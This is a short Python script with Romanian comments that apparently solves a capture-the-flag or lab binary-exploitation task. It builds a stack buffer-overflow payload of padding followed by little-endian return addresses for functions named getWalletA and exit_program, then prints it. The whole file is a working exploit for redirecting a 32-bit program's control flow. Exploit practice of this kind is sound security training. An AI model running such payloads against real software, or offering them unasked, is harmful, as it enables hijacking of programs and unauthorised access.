#!/usr/bin/env python

offset = 0x25 +0x4

# adrese invers 2 cate 2 litere (080484e5 => \xe5\x84\x04\x08)
payload = offset* 'a' + '\xa6\x84\x04\x08' +'\xe5\x84\x04\x08'
#                         getWalletA adr     exit_program adr
print(payload)

